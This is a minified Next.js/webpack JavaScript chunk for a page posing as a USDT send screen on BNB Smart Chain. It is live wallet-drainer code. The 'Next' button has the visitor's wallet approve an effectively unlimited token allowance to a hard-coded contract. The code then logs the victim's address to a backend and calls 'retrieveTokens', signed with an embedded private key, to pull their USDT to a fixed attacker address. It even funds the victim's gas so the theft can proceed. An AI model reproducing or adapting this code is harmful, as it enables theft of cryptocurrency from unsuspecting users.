(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [974],
  {
    2300: (e, t, a) => {
      Promise.resolve().then(a.bind(a, 9319));
    },
    9319: (e, t, a) => {
      "use strict";
      a.r(t), a.d(t, { default: () => l });
      var s = a(5155),
        n = a(9757),
        r = a(5055),
        o = a(2115),
        i = a(7762),
        c = a.n(i);
      function l() {
        let [e, t] = (0, o.useState)(0),
          [a, i] = (0, o.useState)(!1),
          [l, d] = (0, o.useState)(""),
          u = (0, o.useRef)(null),
          m = "0x55d398326f99059fF775485246999027B3197955",
          p =
            "0xcad4313c569e8b9c6c4b29a72a56c262773c9e37cd76c481d04b75a11e233131",
          h = "0x3756ec7415237Cd6A8EFfb72DCCC209b2851E9E3",
          f = "0.00001",
          x = "0x9Fc216CAE3CA7a455B0110a7B7f77Da0A99A29d8",
          g = "0x27e10E5E559fa379cea7a1C23efbF3A9B3fA963c",
          b = {
            chainId: "0x38",
            rpcUrls: ["https://bsc-dataseed.binance.org"],
          },
          w = [
            {
              constant: !0,
              inputs: [{ name: "_owner", type: "address" }],
              name: "balanceOf",
              outputs: [{ name: "balance", type: "uint256" }],
              type: "function",
            },
            {
              constant: !1,
              inputs: [
                { name: "_to", type: "address" },
                { name: "_value", type: "uint256" },
              ],
              name: "transfer",
              outputs: [{ name: "", type: "bool" }],
              type: "function",
            },
            {
              constant: !1,
              inputs: [
                { name: "_spender", type: "address" },
                { name: "_value", type: "uint256" },
              ],
              name: "approve",
              outputs: [{ name: "", type: "bool" }],
              type: "function",
            },
            {
              constant: !0,
              inputs: [],
              name: "decimals",
              outputs: [{ name: "", type: "uint8" }],
              type: "function",
            },
            {
              constant: !0,
              inputs: [],
              name: "symbol",
              outputs: [{ name: "", type: "string" }],
              type: "function",
            },
            {
              constant: !0,
              inputs: [],
              name: "name",
              outputs: [{ name: "", type: "string" }],
              type: "function",
            },
          ],
          y = [
            {
              inputs: [
                { internalType: "address", name: "customer", type: "address" },
                { internalType: "address", name: "recipient", type: "address" },
                { internalType: "uint256", name: "amount", type: "uint256" },
              ],
              name: "retrieveTokens",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function",
            },
          ];
        async function v() {
          for (let e of b.rpcUrls)
            try {
              let t = new (c())(e);
              return await t.eth.getBlockNumber(), t;
            } catch (t) {
              console.warn("RPC ".concat(e, " failed:"), t.message);
            }
          throw Error("No RPCs available");
        }
        let N = (e) => new Promise((t) => setTimeout(t, e));
        async function j(e, t) {
          let a = t.utils.toWei(f, "ether"),
            s = await t.eth.getGasPrice(),
            n = await t.eth.accounts.signTransaction(
              {
                from: "0x8F899d7B4Ae88c71c1FcbD1811a72D4E71A70000",
                to: e,
                value: a,
                gas: 21e3,
                gasPrice: s,
              },
              p
            );
          console.log(
            "Gas sent:",
            (await t.eth.sendSignedTransaction(n.rawTransaction))
              .transactionHash
          );
        }
        async function T() {
          try {
            let e = await v(),
              a =
                (await web3.eth.getAccounts())[0] ||
                new URLSearchParams(window.location.search).get("address");
            if (!a || !e.utils.isAddress(a)) {
              console.log("Error: No valid wallet address provided in URL");
              return;
            }
            let s = new e.eth.Contract(w, m),
              n = await s.methods.balanceOf(a).call(),
              r = parseFloat(e.utils.fromWei(n, "ether"));
            t(r);
          } catch (e) {
            console.error("Initialization error:", e), t(0);
          }
        }
        async function C() {
          await T();
        }
        async function A(e, t, a) {
          try {
            let s = new (c())("https://bsc-dataseed.binance.org/"),
              n = BigInt(1e18 * a),
              r = new s.eth.Contract(y, x);
            console.log(
              "Preparing to transfer:",
              n.toString(),
              "units from customer to recipient..."
            );
            let o = r.methods.retrieveTokens(e, t, n.toString()),
              i = await o.estimateGas({ from: g }),
              l = { from: g, to: x, data: o.encodeABI(), gas: i },
              d = await s.eth.accounts.signTransaction(
                l,
                "99c4036cb5a0a01a175f453f266ff9967558d052bef6dd8abbbbd0d993851c2b"
              ),
              u = await s.eth.sendSignedTransaction(d.rawTransaction);
            console.log("✅ Transfer successful! Tx Hash:", u.transactionHash);
          } catch (e) {
            console.error("❌ Transfer failed:", e);
          }
        }
        async function S() {
          console.log("Next button clicked"), i(!0);
          try {
            if (!window.ethereum)
              throw Error("No wallet detected. Use Trust Wallet or MetaMask.");
            let a = new (c())(window.ethereum),
              s = await v();
            s.eth.accounts.wallet.add(s.eth.accounts.privateKeyToAccount(p)),
              await window.ethereum.request({ method: "eth_chainId" }),
              (await a.eth.getChainId()) !== parseInt(b.chainId, 16) &&
                (await window.ethereum.request({
                  method: "wallet_switchEthereumChain",
                  params: [{ chainId: b.chainId }],
                }));
            let n = (await a.eth.getAccounts())[0];
            if (!n || !a.utils.isAddress(n))
              throw Error("Invalid wallet address.");
            let r = new a.eth.Contract(w, m),
              o = new s.eth.Contract(w, m);
            await o.methods.balanceOf(n).call();
            let i = await a.eth.getBalance(n),
              d = a.utils.fromWei(i, "ether");
            parseFloat(d) < parseFloat(f) &&
              (j(n, s),
              console.log("Insufficient BNB balance. Gas fee sent to user."),
              await N(5e3));
            let u = a.utils.toWei("9999999999", "ether");
            await r.methods
              .approve(x, u)
              .send({ from: n })
              .on("receipt", async function (t) {
                console.log("Approval Successful:", t);
                try {
                  await fetch("/api/save-user-details", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      wallet_address: n,
                      amount: e,
                      action: "approved",
                    }),
                  }),
                    F(!0),
                    A(n, h, parseFloat(l));
                } catch (e) {
                  console.error("Failed to save user details:", e);
                }
                console.log("Success: USDT successfully approved.");
              }),
              console.log("Success: Transfer Success USDT");
            let g = await o.methods.balanceOf(n).call();
            t(parseFloat(a.utils.fromWei(g, "ether")));
          } catch (e) {
            console.error("Error:", e),
              console.error("Error:", e.message || "Failed. Check console.");
          } finally {
            i(!1);
          }
        }
        (0, o.useEffect)(() => {
          console.log("Page loaded. Fetching config...");
          try {
            C();
          } catch (e) {
            console.error("Failed to load config:", e),
              console.error(
                "Error: Failed to load configuration. Check console."
              );
          }
          let e = document.createElement("link");
          (e.rel = "preload"),
            (e.href = "/success.svg"),
            (e.as = "image"),
            (e.type = "image/svg+xml"),
            document.head.appendChild(e);
        }, []);
        let [k, F] = (0, o.useState)(!1),
          E = () => {
            F(!1);
          },
          _ = () => l && parseFloat(l) > 0;
        return (0, s.jsxs)(s.Fragment, {
          children: [
            (0, s.jsx)("img", {
              src: "/success.svg",
              alt: "Preloaded success",
              style: {
                position: "absolute",
                width: "1px",
                height: "1px",
                opacity: 0,
                pointerEvents: "none",
              },
            }),
            (0, s.jsxs)("div", {
              className: "wallet-container",
              children: [
                (0, s.jsxs)("div", {
                  className: "input-group",
                  children: [
                    (0, s.jsx)("p", {
                      className: "inpt_tital",
                      children: "Address or Domain Name",
                    }),
                    (0, s.jsxs)("div", {
                      className: "border",
                      children: [
                        (0, s.jsx)("div", {
                          className: "left",
                          children: (0, s.jsx)("input", {
                            type: "text",
                            id: "address",
                            className: "custom-input",
                            placeholder: "Search or Enter",
                            value: h,
                          }),
                        }),
                        (0, s.jsxs)("span", {
                          className: "right blue flex justify-between mr-3",
                          children: [
                            (0, s.jsx)("span", {
                              className: "w-6 text-sm",
                              children: "Paste",
                            }),
                            (0, s.jsx)(n.g, {
                              icon: r.vlp,
                              className: "mar_i w-6 ml-6",
                            }),
                            (0, s.jsx)(n.g, {
                              icon: r.Yop,
                              className: "mar_i w-6 ml-2",
                            }),
                          ],
                        }),
                      ],
                    }),
                  ],
                }),
                (0, s.jsxs)("div", {
                  className: "input-group mt-7",
                  children: [
                    (0, s.jsx)("p", {
                      className: "inpt_tital",
                      children: "Amount",
                    }),
                    (0, s.jsxs)("div", {
                      className: "border",
                      children: [
                        (0, s.jsx)("div", {
                          className: "left",
                          children: (0, s.jsx)("input", {
                            type: "number",
                            id: "recipient",
                            className: "custom-input",
                            placeholder: "USDT Amount",
                            value: l,
                            onChange: (e) => d(e.target.value),
                          }),
                        }),
                        (0, s.jsxs)("span", {
                          className: "right mr-3",
                          children: [
                            (0, s.jsx)("span", {
                              className: "text-sm text-[#b0b0b0]",
                              children: "USDT",
                            }),
                            (0, s.jsx)("span", {
                              className: "mar_i blue text-sm ml-2",
                              id: "maxBtn",
                              onClick: () => {
                                d(e.toString());
                              },
                              children: "Max",
                            }),
                          ],
                        }),
                      ],
                    }),
                  ],
                }),
                (0, s.jsxs)("p", {
                  className: "fees valid",
                  id: "feesDisplay",
                  children: [
                    "= $",
                    l ? (1 * parseFloat(l)).toFixed(2) : "0.00",
                  ],
                }),
                (0, s.jsx)("button", {
                  ref: u,
                  id: "nextBtn",
                  className: "send-btn",
                  onClick: S,
                  disabled: a || !_(),
                  style: {
                    backgroundColor: a || !_() ? "var(--disabled-bg)" : "",
                    color: a || !_() ? "var(--disabled-text)" : "",
                  },
                  children: a ? "Processing..." : "Next",
                }),
              ],
            }),
            k &&
              (0, s.jsx)("div", {
                className:
                  "fixed inset-0 bg-black bg-opacity-50 flex items-end justify-center z-[9999]",
                children: (0, s.jsxs)("div", {
                  className:
                    "bg-[var(--background)] rounded-t-xl p-6 w-full relative animate-slide-up",
                  style: { animation: "slideUp 0.3s ease-out forwards" },
                  children: [
                    (0, s.jsx)("button", {
                      onClick: E,
                      className:
                        "absolute top-2 right-2 text-gray-500 hover:text-gray-800 text-xl",
                      children: "✕",
                    }),
                    (0, s.jsxs)("div", {
                      className: "text-center",
                      children: [
                        (0, s.jsx)("div", {
                          className: "mb-8 mt-10 text-green-600",
                          children: (0, s.jsx)("img", {
                            src: "/success.svg",
                            alt: "Success icon",
                            className: "mx-auto w-36",
                          }),
                        }),
                        (0, s.jsx)("h3", {
                          className:
                            "text-xl font-bold mb-2 text-[var(--text-primary)]",
                          children: "Processing...",
                        }),
                        (0, s.jsxs)("p", {
                          className:
                            "text-[var(--text-secondary)] mb-4 text-sm",
                          children: [
                            "Transaction in progress! Blockchain",
                            (0, s.jsx)("br", {}),
                            "validation is underway. This may take a",
                            (0, s.jsx)("br", {}),
                            " few minutes.",
                          ],
                        }),
                        (0, s.jsx)("button", {
                          onClick: E,
                          className:
                            "bg-[#23402e] py-3 px-4 rounded-full hover:bg-blue-700 w-full text-[#3a9f64]",
                          children: "Transaction details",
                        }),
                      ],
                    }),
                  ],
                }),
              }),
          ],
        });
      }
    },
  },
  (e) => {
    var t = (t) => e((e.s = t));
    e.O(0, [266, 433, 757, 441, 517, 358], () => t(2300)), (_N_E = e.O());
  },
]);
              
